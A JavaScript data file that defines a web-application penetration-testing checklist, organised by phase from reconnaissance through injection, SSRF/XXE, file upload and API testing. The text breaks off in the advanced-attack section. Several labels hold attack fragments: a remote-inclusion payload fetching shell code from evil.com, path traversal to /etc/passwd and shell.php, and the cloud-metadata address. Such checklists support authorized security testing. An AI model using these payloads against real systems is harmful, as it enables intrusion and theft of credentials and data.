window.CHECKLIST_WEB = [
  {
    id: "web_phase1", icon: "fas fa-search", label: "PHASE 1: Information Gathering & Passive Reconnaissance", severity: "info",
    children: [
      {
        id: "web1_domain", label: "Domain & Infrastructure Intelligence", children: [
          { id: "whois_current", label: "WHOIS Lookup — Current registration, registrar, expiry, registrant details" },
          { id: "whois_history", label: "WHOIS Historical Records — Ownership changes, past contacts (DomainTools)" },
          { id: "dns_records", label: "Full DNS Enumeration — A, AAAA, MX, TXT, NS, CNAME, SOA, SRV, SPF, DMARC, DKIM" },
          { id: "dns_zone_transfer", label: "DNS Zone Transfer Attempt (AXFR) — Misconfigured DNS servers" },
          { id: "dnssec_check", label: "DNSSEC Configuration — Validate signing, algorithm, key rotation" },
          { id: "reverse_dns", label: "Reverse DNS / PTR Records — Co-hosted infrastructure identification" },
          { id: "ip_range_whois", label: "IP Range WHOIS & ASN Lookup — Network blocks and upstream providers" },
          { id: "ssl_cert_analysis", label: "SSL/TLS Certificate — Subject, SANs, issuer, validity, key strength, chain" },
          { id: "cert_transparency", label: "Certificate Transparency Logs — Subdomain discovery via crt.sh, Censys" },
          { id: "ip_reputation", label: "IP Reputation Check — AbuseIPDB, Spamhaus, VirusTotal" },
        ]
      },
      {
        id: "web1_subdomain", label: "Subdomain Discovery & Enumeration", children: [
          { id: "sub_passive_list", label: "Passive Aggregators — Subfinder, Amass passive, AssetFinder, Chaos" },
          { id: "sub_brute_force", label: "Active Brute-forcing — Puredns, MassDNS, ShuffleDNS with wordlists" },
          { id: "sub_permutation", label: "Permutation & Mutation — AlterDNS, Gotator, Dnscewl (dev, staging, test, api)" },
          { id: "sub_virustotal", label: "VirusTotal Passive DNS — Historical DNS records and resolved subdomains" },
          { id: "sub_rapid7_fdns", label: "Rapid7 FDNS Dataset — Cross-reference massive DNS databases" },
          { id: "sub_search_engines", label: "Search Engine Discovery — site:target.com on Google, Bing, DuckDuckGo" },
          { id: "sub_archive", label: "Wayback Machine Extraction — gau, waybackurls, httpx for historical assets" },
          { id: "sub_js_sources", label: "JavaScript Source Discovery — Extract domains from JS files" },
          { id: "sub_cdn_detection", label: "CDN/WAF Identification — Cloudflare, Akamai, Fastly, AWS CloudFront" },
          { id: "sub_resolvers", label: "DNS Resolver Validation — Remove dead subdomains (dnsx)" },
        ]
      },
      {
        id: "web1_osint", label: "Open Source Intelligence (OSINT)", children: [
          { id: "org_research", label: "Organization Research — Crunchbase, LinkedIn, company filings, acquisitions" },
          { id: "employee_profiling", label: "Employee & Tech Stack Profiling — LinkedIn roles, technologies, hiring posts" },
          { id: "email_harvesting", label: "Email Address Harvesting — Hunter.io, Snov.io, theHarvester" },
          { id: "tech_stack_detect", label: "Technology Stack — Wappalyzer, BuiltWith, WhatWeb, Netcraft" },
          { id: "code_repo_audit", label: "Code Repository Audit — GitHub, GitLab, Bitbucket for leaked secrets" },
          { id: "github_dorking", label: "GitHub/GitLab Dorking — org:target passwords, tokens, config files" },
          { id: "data_breach_check", label: "Data Breach Exposure — HaveIBeenPwned, DeHashed" },
          { id: "social_media_intel", label: "Social Media Intelligence — Twitter, Facebook, Instagram info leakage" },
          { id: "document_metadata", label: "Document Metadata — EXIF data, author names, internal paths from PDFs/Docs" },
          { id: "search_engine_dorking", label: "Advanced Google Dorking — site:, filetype:, inurl:, intext:" },
        ]
      },
      {
        id: "web1_infra_mapping", label: "Infrastructure & Service Mapping", children: [
          { id: "shodan_recon", label: "Shodan Recon — Exposed ports, services, banners on target IPs" },
          { id: "censys_recon", label: "Censys Recon — Certificate and host analysis, protocol enumeration" },
          { id: "zoomeye_fofa", label: "ZoomEye / FOFA / BinaryEdge — Additional search engines" },
          { id: "greyhat_wart", label: "GreyNoise — Internet-wide scanner and noise identification" },
          { id: "securitytxt", label: "security.txt — /.well-known/security.txt for security contact/policy" },
          { id: "robots_sitemap", label: "robots.txt & sitemap.xml — Disallowed paths, hidden directories" },
          { id: "favicon_hash", label: "Favicon Hash Matching — Same technology across targets" },
          { id: "cloud_assets", label: "Cloud Asset Discovery — AWS, Azure, GCP resources linked to target" },
          { id: "pastebin_monitor", label: "Pastebin Monitoring — Leaked credentials or internal data" },
        ]
      }
    ]
  },
  {
    id: "web_phase2", icon: "fas fa-network-wired", label: "PHASE 2: Active Reconnaissance & Application Mapping", severity: "low",
    children: [
      {
        id: "web2_port_scan", label: "Port Scanning & Service Detection", children: [
          { id: "nmap_tcp_full", label: "Full TCP Port Scan (Nmap -sS -p-) — All 65535 TCP ports" },
          { id: "nmap_udp_scan", label: "UDP Port Scan (Nmap -sU) — DNS, SNMP, NTP, SIP services" },
          { id: "nmap_version_scan", label: "Service Version Detection (Nmap -sV -sC) — Versions and default scripts" },
          { id: "nmap_os_detect", label: "Operating System Detection (Nmap -O) — TCP/IP stack fingerprinting" },
          { id: "masscan_fast", label: "Masscan — Rapid full-port scanning across large IP ranges" },
          { id: "rustscan_modern", label: "RustScan — Fast port detection piped into Nmap" },
          { id: "service_enumeration", label: "Service-Specific Enumeration — FTP anonymous, SMB shares, SNMP strings" },
          { id: "banner_grabbing", label: "Manual Banner Grabbing — netcat, curl, openssl s_client" },
          { id: "http_probing", label: "HTTP/HTTPS Probing — httpx, httprobe for live web services" },
          { id: "vhost_discovery", label: "Virtual Host Discovery — Fuzz Host header (ffuf -H Host)" },
        ]
      },
      {
        id: "web2_crawl", label: "Web Application Crawling & Discovery", children: [
          { id: "crawl_gospider", label: "Multi-Threaded Crawling — GoSpider, Katana for site mapping" },
          { id: "crawl_wayback", label: "Historical URL Recovery — waybackurls, gau, gauplus" },
          { id: "crawl_param_extract", label: "Parameter Extraction — Uro, ParamSpider for URL parameters" },
          { id: "crawl_js_analysis", label: "JavaScript Analysis — Download .js files, extract endpoints, APIs, keys" },
          { id: "crawl_api_discovery", label: "API Endpoint Discovery — /api, /graphql, /swagger, /openapi, /docs" },
          { id: "crawl_sitemap_gen", label: "Sitemap Generation — Complete URL tree of all endpoints" },
          { id: "crawl_auth_pages", label: "Auth Page Discovery — /login, /register, /forgot-password, /oauth, /admin" },
          { id: "crawl_file_types", label: "File Extension Discovery — .bak, .old, .zip, .sql, .config, .env" },
          { id: "crawl_technology_fp", label: "Technology Fingerprinting — Framework, CMS, server, language, DB" },
          { id: "crawl_content_type", label: "Content-Type Analysis — JSON, XML, HTML, redirects, error pages" },
        ]
      },
      {
        id: "web2_fuzz", label: "Content Discovery & Directory Fuzzing", children: [
          { id: "dir_fuzz_common", label: "Common Directory Fuzzing — ffuf, feroxbuster with SecLists" },
          { id: "dir_fuzz_recursive", label: "Recursive Fuzzing — Follow and fuzz deeper directory levels" },
          { id: "dir_file_ext", label: "File Extension Fuzzing — .php, .aspx, .jsp, .bak, .old, .swp, .save" },
          { id: "dir_backup_files", label: "Backup File Discovery — .git, .svn, .DS_Store, .viminfo" },
          { id: "dir_config_files", label: "Configuration File Probing — web.config, .htaccess, wp-config.php" },
          { id: "dir_admin_panels", label: "Admin Panel Discovery — /admin, /dashboard, /manager, /phpmyadmin" },
          { id: "dir_api_fuzz", label: "API Path Fuzzing — /api/v1/, /api/v2/, /internal/, /debug/" },
          { id: "dir_http_methods", label: "HTTP Method Fuzzing — OPTIONS, TRACE, PUT, DELETE, PATCH" },
          { id: "dir_fuzz_custom", label: "Custom Wordlist Fuzzing — CMS/framework-specific paths" },
          { id: "dir_cloud_storage", label: "Cloud Storage Probing — S3, Azure Blobs, GCP buckets" },
        ]
      },
      {
        id: "web2_waf", label: "WAF / IPS / Protection Identification", children: [
          { id: "waf_detect_tool", label: "Automated WAF Detection — wafw00f, IdentYwaf" },
          { id: "waf_headers", label: "WAF Header Analysis — Server headers, cookies, response patterns" },
          { id: "waf_bypass_probe", label: "WAF Bypass Probing — Case manipulation, encoding, comments, null bytes" },
          { id: "waf_rate_limit", label: "Rate Limiting Assessment — Request throttling, CAPTCHA triggers" },
          { id: "waf_error_pages", label: "Error Page Analysis — Trigger errors for WAF vendor ID" },
          { id: "waf_payload_detect", label: "Payload Detection Rules — Which payloads are blocked (SQLi, XSS, cmdi)" },
        ]
      }
    ]
  },
  {
    id: "web_phase3", icon: "fas fa-shield-alt", label: "PHASE 3: Security Headers & Configuration Analysis", severity: "low",
    children: [
      {
        id: "web3_sec_headers", label: "HTTP Security Headers", children: [
          { id: "header_csp", label: "Content-Security-Policy — unsafe-inline, unsafe-eval, wildcard sources" },
          { id: "header_hsts", label: "Strict-Transport-Security — max-age, includeSubDomains, preload" },
          { id: "header_xframe", label: "X-Frame-Options / CSP frame-ancestors — Clickjacking protection" },
          { id: "header_xcontent", label: "X-Content-Type-Options: nosniff — MIME sniffing prevention" },
          { id: "header_referrer", label: "Referrer-Policy — Information leakage via Referer header" },
          { id: "header_permissions", label: "Permissions-Policy — Browser feature restrictions" },
          { id: "header_cross_origin", label: "Cross-Origin Policies — COOP, COEP headers" },
          { id: "header_cache", label: "Cache-Control — Sensitive data caching prevention" },
          { id: "header_server", label: "Server / X-Powered-By — Version information disclosure" },
        ]
      },
      {
        id: "web3_cors", label: "Cross-Origin Resource Sharing (CORS)", children: [
          { id: "cors_origin_reflect", label: "Origin Reflection — Arbitrary Origin in Access-Control-Allow-Origin" },
          { id: "cors_null_origin", label: "Null Origin Bypass — iframe-based CORS bypass with null origin" },
          { id: "cors_wildcard", label: "Wildcard CORS (*) — With credentials check" },
          { id: "cors_prefix_match", label: "Prefix/Subdomain Match — target.com.evil.com confusion" },
          { id: "cors_credentials", label: "Access-Control-Allow-Credentials — Authenticated data theft potential" },
          { id: "cors_methods", label: "CORS Allowed Methods — PUT, DELETE, PATCH in allowed methods" },
          { id: "cors_preflight", label: "Preflight Bypass — Non-preflighted simple request testing" },
        ]
      },
      {
        id: "web3_ssl_tls", label: "SSL/TLS Configuration", children: [
          { id: "tls_protocols", label: "TLS Protocol Version — Reject SSLv2/3, TLS 1.0/1.1; require 1.2+" },
          { id: "tls_cipher_suites", label: "Cipher Suite Analysis — RC4, DES, EXPORT, NULL, anon ciphers" },
          { id: "tls_cert_valid", label: "Certificate Validity — Expiration, self-signed, trust chain" },
          { id: "tls_cert_key", label: "Certificate Key Strength — RSA 2048+ or ECDSA P-256+" },
          { id: "tls_heartbleed", label: "Heartbleed & Known CVEs — ROBOT, Logjam, DROWN" },
          { id: "tls_renegotiation", label: "Secure Renegotiation — Insecure renegotiation check" },
          { id: "tls_compression", label: "TLS Compression — CRIME/BREACH attack potential" },
          { id: "tls_forward_sec", label: "Forward Secrecy — ECDHE/DHE key exchange preference" },
          { id: "tls_ocsp_stapling", label: "OCSP Stapling — Certificate revocation status" },
        ]
      },
      {
        id: "web3_server_config", label: "Web Server Configuration", children: [
          { id: "server_method_trace", label: "HTTP TRACE Method — Cross-Site Tracing (XST)" },
          { id: "server_directory_list", label: "Directory Listing — Indexes enabled file exposure" },
          { id: "server_default_pages", label: "Default Pages — IIS, Apache test, Nginx welcome pages" },
          { id: "server_error_disclosure", label: "Error Page Disclosure — Stack traces, file paths, versions" },
          { id: "server_http_version", label: "HTTP/2 and HTTP/3 — Protocol-specific vulnerabilities" },
          { id: "server_websocket", label: "WebSocket Security — wss:// enforcement, origin validation" },
          { id: "server_misconfig", label: "Server Misconfiguration — Default creds, debug modes, admin panels" },
        ]
      }
    ]
  },
  {
    id: "web_phase4", icon: "fas fa-lock", label: "PHASE 4: Authentication & Identity Testing", severity: "critical",
    children: [
      {
        id: "web4_auth_basic", label: "Login & Credential Testing", children: [
          { id: "auth_brute_force", label: "Brute-Force — Credential stuffing, dictionary attacks" },
          { id: "auth_default_creds", label: "Default Credentials — admin:admin, vendor defaults" },
          { id: "auth_user_enum", label: "Username Enumeration — Error messages, timing, lockout behavior" },
          { id: "auth_resp_timing", label: "Timing-Based Enumeration — Response time differences" },
          { id: "auth_resp_delta", label: "Response Delta — HTTP status, content length, redirects" },
          { id: "auth_account_lockout", label: "Account Lockout — Threshold, duration, bypass methods" },
          { id: "auth_captcha_bypass", label: "CAPTCHA Bypass — Reuse, missing validation, OCR" },
          { id: "auth_2fa_bypass", label: "2FA/MFA Bypass — Code reuse, response manipulation, null OTP" },
          { id: "auth_force_browse", label: "Forced Browsing — Direct access to authenticated pages" },
          { id: "auth_remember_me", label: "Remember Me Token — Predictability, storage, revocation" },
        ]
      },
      {
        id: "web4_password", label: "Password Reset & Recovery", children: [
          { id: "pwd_reset_token", label: "Reset Token Entropy — Randomness, predictability, length" },
          { id: "pwd_reset_expiry", label: "Token Expiration — Reuse after expiration testing" },
          { id: "pwd_reset_host_header", label: "Host Header Injection — Poison password reset link" },
          { id: "pwd_reset_param", label: "Parameter Manipulation — Change email/user ID in reset request" },
          { id: "pwd_reset_leak", label: "Token Leakage — Referer header, logs, browser history" },
          { id: "pwd_reset_no_old", label: "Old Password Not Required — Password change without current password" },
          { id: "pwd_reset_weak_policy", label: "Weak Password Policy — Length, complexity, common password checks" },
          { id: "pwd_reset_answer", label: "Security Question Weakness — Brute-force, public answers" },
        ]
      },
      {
        id: "web4_oauth_sso", label: "OAuth, SSO & Federation", children: [
          { id: "oauth_redirect_uri", label: "redirect_uri Validation — Open redirect, localhost bypass" },
          { id: "oauth_state_param", label: "State Parameter — Missing/weak state enabling CSRF" },
          { id: "oauth_implicit_flow", label: "Implicit Flow — Token leakage in URL fragment" },
          { id: "oauth_code_intercept", label: "Authorization Code Interception — PKCE requirement testing" },
          { id: "oauth_token_reuse", label: "Token Reuse — Revocation and expiration testing" },
          { id: "oauth_scope", label: "Scope Escalation — Elevated scope requests" },
          { id: "saml_xml_inject", label: "SAML XML Injection — Assertion modification, signature wrapping" },
          { id: "saml_cert_removal", label: "SAML Certificate Removal — Unsigned response acceptance" },
          { id: "jwt_alg_none", label: "JWT alg:none — Remove signature, set algorithm to none" },
          { id: "jwt_alg_confusion", label: "JWT Algorithm Confusion — RS256 to HS256 switch" },
          { id: "jwt_weak_secret", label: "JWT Weak Secret — Brute-force signing key" },
          { id: "jwt_kid_inject", label: "JWT kid Injection — SQLi or path traversal via kid" },
          { id: "jwt_expired_reuse", label: "Expired Token Reuse — Server accepts expired JWTs" },
        ]
      },
      {
        id: "web4_account_mgmt", label: "Account Management", children: [
          { id: "acct_registration", label: "Registration Flaws — Duplicate accounts, email bypass, disposable emails" },
          { id: "acct_email_verify", label: "Email Verification Bypass — Access before verification click" },
          { id: "acct_concurrent", label: "Concurrent Session Limits — Multiple simultaneous logins" },
          { id: "acct_deactivation", label: "Account Deactivation — Session termination, data handling" },
          { id: "acct_profile_edit", label: "Profile Edit Authorization — IDOR on profile editing" },
        ]
      }
    ]
  },
  {
    id: "web_phase5", icon: "fas fa-cookie-bite", label: "PHASE 5: Session Management & CSRF Testing", severity: "critical",
    children: [
      {
        id: "web5_cookie", label: "Cookie Security", children: [
          { id: "cookie_secure_flag", label: "Secure Flag — HTTPS-only transmission" },
          { id: "cookie_httponly", label: "HttpOnly Flag — No JavaScript access (document.cookie)" },
          { id: "cookie_samesite", label: "SameSite Attribute — Strict/Lax for CSRF prevention" },
          { id: "cookie_domain_scope", label: "Domain Scope — Overly broad domain cookies" },
          { id: "cookie_path_scope", label: "Path Scope — Appropriate URL path scoping" },
          { id: "cookie_expiry", label: "Cookie Expiration — Excessively long-lived sessions" },
          { id: "cookie_prefix", label: "Cookie Prefixes — __Host- and __Secure- enforcement" },
        ]
      },
      {
        id: "web5_session", label: "Session Token Security", children: [
          { id: "session_fixation", label: "Session Fixation — Same session ID before/after login" },
          { id: "session_regeneration", label: "Session Regeneration — New ID on auth state change" },
          { id: "session_entropy", label: "Session Token Entropy — Length, randomness, predictability" },
          { id: "session_exposure", label: "Session in URLs — URL, Referer, or log exposure" },
          { id: "session_logout", label: "Logout — Server-side session invalidation" },
          { id: "session_timeout", label: "Session Timeout — Absolute and idle timeout" },
        ]
      },
      {
        id: "web5_csrf", label: "Cross-Site Request Forgery (CSRF)", children: [
          { id: "csrf_token_presence", label: "CSRF Token Presence — Anti-CSRF tokens on state-changing requests" },
          { id: "csrf_token_validate", label: "CSRF Token Validation — Missing, wrong, null token acceptance" },
          { id: "csrf_token_reuse", label: "CSRF Token Reuse — Static vs session-tied tokens" },
          { id: "csrf_method_bypass", label: "CSRF Method Bypass — GET for state changes, method override" },
          { id: "csrf_custom_header", label: "Custom Header Bypass — X-Requested-With, Content-Type bypass" },
          { id: "csrf_same_site", label: "SameSite Cookie Bypass — CSRF despite SameSite settings" },
          { id: "csrf_referer", label: "Referer-Based CSRF — Referer stripping bypass" },
          { id: "csrf_json_body", label: "JSON Body CSRF — Content-Type: application/json POST" },
        ]
      }
    ]
  },
  {
    id: "web_phase6", icon: "fas fa-unlock-alt", label: "PHASE 6: Authorization & Access Control Testing", severity: "critical",
    children: [
      {
        id: "web6_idor", label: "Insecure Direct Object Reference (IDOR)", children: [
          { id: "idor_numeric_id", label: "Numeric ID Manipulation — User IDs, order IDs, document IDs" },
          { id: "idor_uuid_guid", label: "UUID/GUID Testing — Predictability of non-sequential IDs" },
          { id: "idor_hidden_param", label: "Hidden Parameter IDOR — Hidden form fields, JSON body IDs" },
          { id: "idor_api_endpoint", label: "API Endpoint IDOR — /api/users/{id}, /api/orders/{id}" },
          { id: "idor_multi_param", label: "Multi-Parameter IDOR — user_id, account_id, org_id combos" },
          { id: "idor_http_method", label: "HTTP Method IDOR — GET, PUT, POST, DELETE on same resource" },
          { id: "idor_export", label: "Export/Download IDOR — File downloads, CSV exports" },
        ]
      },
      {
        id: "web6_privesc", label: "Privilege Escalation", children: [
          { id: "privesc_vertical", label: "Vertical — Admin panel/API access with low-privilege account" },
          { id: "privesc_horizontal", label: "Horizontal — Same privilege level, different user's data" },
          { id: "privesc_api_direct", label: "Direct API Access — Bypass UI, call admin APIs directly" },
          { id: "privesc_param_inject", label: "Parameter Injection — is_admin=true, role=admin" },
          { id: "privesc_method_swap", label: "HTTP Method Swap — GET to POST/PUT/DELETE" },
          { id: "privesc_mass_assign", label: "Mass Assignment — Inject role, admin, permissions in JSON" },
          { id: "privesc_feature_toggle", label: "Feature Flag Bypass — Premium feature manipulation" },
        ]
      },
      {
        id: "web6_rbac", label: "Role-Based Access Control (RBAC)", children: [
          { id: "rbac_matrix", label: "RBAC Matrix — All roles vs all functions gap analysis" },
          { id: "rbac_function_level", label: "Function-Level — Role verification before execution" },
          { id: "rbac_data_level", label: "Data-Level — User data scope enforcement" },
          { id: "rbac_api_version", label: "API Version — Older API versions with weaker controls" },
          { id: "rbac_graphql", label: "GraphQL — Introspection, query depth, mutation permissions" },
          { id: "rbac_static_files", label: "Static Files — Direct access to protected resources" },
          { id: "rbac_websocket", label: "WebSocket — Auth and authorization on WS channels" },
        ]
      },
      {
        id: "web6_access_control", label: "Additional Access Controls", children: [
          { id: "ac_url_based", label: "URL-Based — Direct restricted URL access without UI" },
          { id: "ac_referer_check", label: "Referer-Based — Referer header manipulation" },
          { id: "ac_ip_restrict", label: "IP Restriction Bypass — X-Forwarded-For manipulation" },
          { id: "ac_time_based", label: "Time-Based — Time-of-day, account expiry restrictions" },
          { id: "ac_pagination", label: "Pagination — Restricted list pages without authorization" },
        ]
      }
    ]
  },
  {
    id: "web_phase7", icon: "fas fa-syringe", label: "PHASE 7: Injection Vulnerability Testing", severity: "critical",
    children: [
      {
        id: "web7_sqli", label: "SQL Injection (SQLi)", children: [
          { id: "sqli_inband", label: "In-Band — Error-based and Union-based" },
          { id: "sqli_blind_bool", label: "Blind Boolean-Based — TRUE/FALSE response differences" },
          { id: "sqli_blind_time", label: "Blind Time-Based — SLEEP(), WAITFOR DELAY timing" },
          { id: "sqli_stacked", label: "Stacked Queries — Multiple statements (semicolon)" },
          { id: "sqli_out_of_band", label: "Out-of-Band — DNS/HTTP exfiltration (xp_dirtree, UTL_HTTP)" },
          { id: "sqli_second_order", label: "Second-Order — Stored payload triggers on subsequent request" },
          { id: "sqli_header", label: "Header-Based — User-Agent, Referer, X-Forwarded-For" },
          { id: "sqli_nosql", label: "NoSQL Injection — MongoDB operators ($gt, $ne, $where)" },
          { id: "sqli_orm", label: "ORM Injection — Hibernate, Sequelize, Entity Framework" },
          { id: "sqli_orderby", label: "ORDER BY / GROUP BY — Sorting parameter injection" },
        ]
      },
      {
        id: "web7_xss", label: "Cross-Site Scripting (XSS)", children: [
          { id: "xss_reflected", label: "Reflected — URL parameter reflected without sanitization" },
          { id: "xss_stored", label: "Stored (Persistent) — Database-stored, served to other users" },
          { id: "xss_dom", label: "DOM-Based — Client-side sinks (innerHTML, document.write, eval)" },
          { id: "xss_blind", label: "Blind — Admin panels, logs, error reports (XSS Hunter)" },
          { id: "xss_context", label: "Context-Based — HTML body, attribute, script, URL, CSS, SVG" },
          { id: "xss_polyglot", label: "Polyglot — Multi-context payloads" },
          { id: "xss_event_handler", label: "Event Handlers — onerror, onload, onmouseover, onfocus" },
          { id: "xss_template", label: "Client-Side Template — AngularJS, Vue.js, Handlebars" },
          { id: "xss_markdown", label: "Markdown-Based — Unsanitized markdown rendering" },
          { id: "xss_file_upload", label: "File Upload XSS — SVG, HTML with embedded JS" },
          { id: "xss_csp_bypass", label: "CSP Bypass — unsafe-inline, nonce, JSONP exploitation" },
        ]
      },
      {
        id: "web7_cmdi", label: "Command Injection (OS Command Injection)", children: [
          { id: "cmdi_basic", label: "Basic — ;, |, &&, ||, $(), backtick chaining" },
          { id: "cmdi_blind", label: "Blind — Time-based (sleep, ping) detection" },
          { id: "cmdi_oob", label: "Out-of-Band — DNS/HTTP exfiltration (interact.sh)" },
          { id: "cmdi_header", label: "Header-Based — Host, User-Agent, Referer, X-Forwarded-For" },
          { id: "cmdi_filename", label: "Filename-Based — File upload name injection" },
          { id: "cmdi_filter_bypass", label: "Filter Bypass — Encoding, wildcards, variable substitution" },
        ]
      },
      {
        id: "web7_ssti", label: "Server-Side Template Injection (SSTI)", children: [
          { id: "ssti_detect", label: "Detection — {{7*7}}, ${7*7}, #{7*7} for engine ID" },
          { id: "ssti_jinja2", label: "Jinja2 (Flask) — config, self, __class__, __subclasses__" },
          { id: "ssti_twig", label: "Twig (Symfony) — _self.env, set, include" },
          { id: "ssti_freemarker", label: "FreeMarker (Java) — ?new, ?exec, ?interpret" },
          { id: "ssti_thymeleaf", label: "Thymeleaf (Spring) — __T__, ${T()} expression injection" },
          { id: "ssti_erb", label: "ERB (Rails) — system(), exec(), IO.popen" },
        ]
      },
      {
        id: "web7_other_inject", label: "Other Injection Types", children: [
          { id: "ldap_injection", label: "LDAP Injection — Search filter injection, auth bypass" },
          { id: "xpath_injection", label: "XPath Injection — XML query injection" },
          { id: "sml_injection", label: "SAML Injection — Signature wrapping, assertion modification" },
          { id: "header_injection", label: "HTTP Header Injection — CRLF for response splitting" },
          { id: "crlf_injection", label: "CRLF Injection — %0d%0a for new header injection" },
          { id: "code_injection", label: "Code Injection — eval(), exec(), include() with user input" },
        ]
      }
    ]
  },
  {
    id: "web_phase8", icon: "fas fa-network-wired", label: "PHASE 8: SSRF, XXE & Server-Side Vulnerabilities", severity: "critical",
    children: [
      {
        id: "web8_ssrf", label: "Server-Side Request Forgery (SSRF)", children: [
          { id: "ssrf_internal", label: "Internal Network — localhost, 127.0.0.1, 10.0.0.0/8" },
          { id: "ssrf_cloud_meta", label: "Cloud Metadata — AWS 169.254.169.254, GCP, Azure IMDS" },
          { id: "ssrf_blind_http", label: "Blind SSRF (HTTP) — Out-of-band via Burp Collaborator" },
          { id: "ssrf_blind_dns", label: "Blind SSRF (DNS) — DNS-based detection (interact.sh)" },
          { id: "ssrf_localhost", label: "Localhost Bypass — 0.0.0.0, [::], 2130706433" },
          { id: "ssrf_redirect", label: "Redirect-Based — URL redirects bypassing allowlists" },
          { id: "ssrf_encoding", label: "Encoding Bypass — URL encoding, hex, octal, DNS encoding" },
          { id: "ssrf_dns_rebinding", label: "DNS Rebinding — TOCTOU DNS resolution attack" },
          { id: "ssrf_protocol", label: "Protocol Abuse — file://, gopher://, dict://, ftp://" },
          { id: "ssrf_port_scan", label: "SSRF Port Scanning — Internal port enumeration via timing" },
          { id: "ssrf_webhook", label: "Webhook/Callback SSRF — User-controlled webhook URLs" },
        ]
      },
      {
        id: "web8_xxe", label: "XML External Entity (XXE)", children: [
          { id: "xxe_basic", label: "Basic XXE — External entity definition and reference" },
          { id: "xxe_file_read", label: "XXE File Read — /etc/passwd, web.config, wp-config.php" },
          { id: "xxe_blind_oob", label: "Blind XXE — DTD parameter entities for exfiltration" },
          { id: "xxe_internal_port", label: "XXE Port Scanning — Connection timeout differences" },
          { id: "xxe_ssrf", label: "XXE-based SSRF — External entity fetching internal resources" },
          { id: "xxe_rce", label: "XXE RCE — PHP expect://, Java jar:// handlers" },
          { id: "xxe_dos", label: "XXE DoS — Billion Laughs / Entity Expansion" },
          { id: "xxe_file_upload", label: "XXE in File Uploads — SVG, DOCX, XLSX, PDF processing" },
          { id: "xxe_waf_bypass", label: "XXE WAF Bypass — Encoding, CDATA, base64 entities" },
          { id: "xxe_param", label: "XXE in Non-XML — JSON-to-XML converters, Content-Type manipulation" },
        ]
      }
    ]
  },
  {
    id: "web_phase9", icon: "fas fa-file-upload", label: "PHASE 9: File Handling & Upload Vulnerabilities", severity: "high",
    children: [
      {
        id: "web9_upload", label: "File Upload Security", children: [
          { id: "upload_webshell", label: "Webshell Upload — .php, .aspx, .jsp, .jspx execution" },
          { id: "upload_mime_bypass", label: "MIME Type Bypass — Content-Type header manipulation" },
          { id: "upload_ext_bypass", label: "Extension Bypass — .pHp, .php5, .phtml, double extensions" },
          { id: "upload_magic_bypass", label: "Magic Byte Bypass — GIF89a, PNG header in malicious files" },
          { id: "upload_content_check", label: "Content Validation Bypass — PHP in image comments (ExifTool)" },
          { id: "upload_path_traversal", label: "Upload Path Traversal — ../../../shell.php in filename" },
          { id: "upload_overwrite", label: "File Overwrite — Overwrite config, .htaccess via upload" },
          { id: "upload_server_config", label: "Server Config Upload — .htaccess or web.config for execution" },
        ]
      },
      {
        id: "web9_file_inclusion", label: "File Inclusion", children: [
          { id: "lfi_local", label: "LFI — ../../etc/passwd, php://filter, php://input" },
          { id: "lfi_log_poison", label: "Log Poisoning — Inject PHP into logs, include for RCE" },
          { id: "lfi_php_filter", label: "PHP Filter Chain — base64-encode for source disclosure" },
          { id: "lfi_php_expect", label: "PHP Input Stream — php://input for POST-based RCE" },
          { id: "lfi_session", label: "Session File Inclusion — PHP session file code execution" },
          { id: "lfi_proc_self", label: "/proc/self/environ — Environment variable injection" },
          { id: "rfi_remote", label: "RFI — include=http://evil.com/shell.txt for RCE" },
          { id: "rfi_data", label: "Data URI Inclusion — data://text/plain;base64 for RCE" },
        ]
      },
      {
        id: "web9_archive", label: "Archive & File Processing", children: [
          { id: "zip_slip_traversal", label: "Zip Slip — Crafted ZIP with ../../../ paths" },
          { id: "zip_bomb", label: "Zip Bomb — Decompression bomb DoS" },
          { id: "xml_bomb", label: "XML Bomb — Billion Laughs entity expansion DoS" },
          { id: "svg_xss", label: "SVG XSS — Embedded JavaScript in SVG uploads" },
          { id: "image_polyglot", label: "Image Polyglot — Valid as both image and executable" },
          { id: "pdf_xss", label: "PDF XSS — JavaScript embedded in PDF" },
        ]
      }
    ]
  },
  {
    id: "web_phase10", icon: "fas fa-cogs", label: "PHASE 10: API & Business Logic Testing", severity: "high",
    children: [
      {
        id: "web10_api", label: "REST API Security", children: [
          { id: "api_auth", label: "API Authentication — JWT, API keys, OAuth validation" },
          { id: "api_authz", label: "API Authorization — BOLA/IDOR on API endpoints" },
          { id: "api_rate_limit", label: "API Rate Limiting — Throttling, brute-force protection" },
          { id: "api_input", label: "API Input Validation — Mass assignment, type confusion" },
          { id: "api_method", label: "HTTP Method Override — X-HTTP-Method-Override headers" },
          { id: "api_version", label: "API Version Security — Older API versions" },
          { id: "api_pagination", label: "API Pagination — Large values, negative values" },
          { id: "api_graphql", label: "GraphQL — Introspection, query depth, batch attacks" },
          { id: "api_webhook", label: "Webhook Security — URL validation, SSRF, replay attacks" },
        ]
      },
      {
        id: "web10_business", label: "Business Logic Vulnerabilities", children: [
          { id: "logic_price", label: "Price Manipulation — Modify price, quantity, discount" },
          { id: "logic_negative", label: "Negative Values — Negative quantities, prices, refunds" },
          { id: "logic_race", label: "Race Conditions — Double spend, coupon reuse, limit bypass" },
          { id: "logic_coupon", label: "Coupon Abuse — Stacking, reuse, timing attacks" },
          { id: "logic_workflow", label: "Workflow Bypass — Skip multi-step process steps" },
          { id: "logic_integer", label: "Integer Overflow — Wraparound, precision issues" },
          { id: "logic_float", label: "Floating Point — Rounding errors in financial calculations" },
          { id: "logic_time", label: "Time-Based Logic — Time zone manipulation, expiration bypass" },
          { id: "logic_otp_bypass", label: "OTP Bypass — Code reuse, brute-force, skip step" },
        ]
      }
    ]
  },
  {
    id: "web_phase11", icon: "fas fa-bug", label: "PHASE 11: Client-Side & Advanced Testing", severity: "high",
    children: [
      {
        id: "web11_client", label: "Client-Side Security", children: [
          { id: "client_dom_xss", label: "DOM-Based XSS — JavaScript sinks analysis" },
          { id: "client_dom_clobber", label: "DOM Clobbering — HTML name/id overriding JS variables" },
          { id: "client_open_redirect", label: "Open Redirect — Unvalidated redirect for phishing" },
          { id: "client_data_leak", label: "Client-Side Data Leakage — localStorage, global variables" },
          { id: "client_source_map", label: "Source Map Exposure — .map files revealing source code" },
          { id: "client_insecure_dep", label: "Insecure Dependencies — Retire.js, npm audit" },
          { id: "client_postmessage", label: "postMessage — Improper origin validation" },
          { id: "client_websocket", label: "WebSocket Security — Auth, authorization, input validation" },
        ]
      },
      {
        id: "web11_advanced", label: "Advanced Attack Vectors", children: [
          { id: "adv_http_smuggle", label: "HTTP Request Smuggling — CL.TE, TE.CL, TE.TE" },
